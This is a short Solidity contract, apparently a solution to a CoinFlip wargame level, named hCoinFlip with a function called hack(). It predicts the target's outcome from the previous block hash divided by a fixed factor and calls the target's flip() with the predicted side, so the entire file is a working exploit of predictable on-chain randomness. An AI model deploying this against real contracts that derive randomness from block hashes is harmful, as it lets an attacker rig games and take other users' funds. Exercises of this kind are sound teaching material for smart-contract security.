// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip{
  function flip(bool _guess) external returns (bool);
}
contract hCoinFlip {
  // 0xD05A3FcEf005f04d1C6f332C6645F3b4C33Abdd3
  CoinFlip coinflip;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  bool public side;

  constructor(address adr) {
    coinflip = CoinFlip(adr);
  }

  function hack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    side = coinFlip == 1 ? true : false;
    coinflip.flip(side);
  }


}